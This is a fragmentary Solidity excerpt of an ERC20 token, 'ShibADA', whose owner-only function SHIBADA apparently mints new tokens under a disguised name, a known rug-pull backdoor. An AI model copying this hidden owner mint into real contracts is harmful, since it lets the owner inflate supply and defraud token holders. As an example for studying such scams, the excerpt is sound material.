...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function SHIBADA(uint256 amount) public onlyOwner {
    SHIBADA(msg.sender, amount);
    }
    ...
    function SHIBADA(address account, uint256 amount) internal virtual {
...
contract ShibADA is ERC20 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC20("ShibADA", "SHIBADA") {
        SHIBADA(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}